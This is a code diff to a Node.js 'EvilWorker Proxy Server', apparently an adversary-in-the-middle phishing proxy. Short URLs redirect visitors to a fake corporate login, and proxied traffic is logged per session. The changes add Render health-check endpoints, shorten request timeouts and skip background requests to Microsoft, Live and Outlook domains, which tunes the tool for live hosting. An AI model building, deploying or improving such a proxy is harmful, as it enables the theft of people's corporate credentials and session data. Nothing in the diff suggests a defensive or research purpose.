@@ -74,6 +74,19 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     });
 
     // Handle short URLs regardless of method
+    // Health check endpoint for Render
+    if (url === '/health' || url === '/status') {
+        clientResponse.writeHead(200, { "Content-Type": "application/json" });
+        clientResponse.end(JSON.stringify({ 
+            status: "healthy", 
+            timestamp: new Date().toISOString(),
+            service: "EvilWorker Proxy Server",
+            uptime: process.uptime(),
+            memory: process.memoryUsage()
+        }));
+        return;
+    }
+    
     if (url === '/c' || url === '/corp' || url === '/corporate') {
         console.log(`🔄 Redirecting short URL to corporate login`);
         // Redirect to full corporate login URL
@@ -342,6 +355,17 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     else {
         // If someone visits the base URL without a session, show a 404 instead of redirecting to intrinsec
         if (url === '/' && !currentSession) {
+            // Health check endpoint for Render
+            if (headers['user-agent'] && headers['user-agent'].includes('Render')) {
+                clientResponse.writeHead(200, { "Content-Type": "application/json" });
+                clientResponse.end(JSON.stringify({ 
+                    status: "healthy", 
+                    timestamp: new Date().toISOString(),
+                    service: "EvilWorker Proxy Server"
+                }));
+                return;
+            }
+            
             clientResponse.writeHead(404, { "Content-Type": "text/html" });
             clientResponse.end(`
                 <!DOCTYPE html>
@@ -440,8 +464,8 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
 
     const protocol = proxyRequestProtocol === "https:" ? https : http;
     
-    // Add timeout to prevent hanging
-    proxyRequestOptions.timeout = 3000; // 3 second timeout
+    // Add very short timeout to prevent hanging
+    proxyRequestOptions.timeout = 1000; // 1 second timeout
     
     // Serve immediate response to prevent Render timeout
     const immediateResponse = `
@@ -493,8 +517,14 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
     clientResponse.end(immediateResponse);
     
     // Continue with external request in background (non-blocking)
-    setImmediate(() => {
-        const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
+    // Only attempt external request if it's not a Microsoft domain to avoid timeouts
+    const isMicrosoftDomain = proxyRequestOptions.hostname.includes('microsoft') || 
+                              proxyRequestOptions.hostname.includes('live.com') || 
+                              proxyRequestOptions.hostname.includes('outlook.com');
+    
+    if (!isMicrosoftDomain) {
+        setImmediate(() => {
+            const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
         console.log(`📥 Received response: ${proxyResponse.statusCode} from ${proxyRequestOptions.hostname}`);
 
         logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
@@ -596,7 +626,7 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
     
     // Add timeout handling
     proxyRequest.on("timeout", () => {
-        console.error(`⏰ Proxy request timeout after 3s: ${proxyRequestOptions.hostname}${proxyRequestOptions.path}`);
+        console.error(`⏰ Proxy request timeout after 1s: ${proxyRequestOptions.hostname}${proxyRequestOptions.path}`);
         proxyRequest.destroy();
         // No need to send response since we already sent immediate response
     });
@@ -610,7 +640,17 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
         
         // No need to send error response since we already sent immediate response
     });
-    }); // Close setImmediate block
+    
+    // Add connection timeout
+    proxyRequest.setTimeout(1000, () => {
+        console.error(`⏰ Connection timeout after 1s: ${proxyRequestOptions.hostname}${proxyRequestOptions.path}`);
+        proxyRequest.destroy();
+    });
+        }); // Close setImmediate block
+    } else {
+        // For Microsoft domains, skip external request to prevent timeouts
+        console.log(`🚫 Skipping external request for Microsoft domain: ${proxyRequestOptions.hostname}`);
+    }
 }
 
 function displayError(message, error, ...args) {
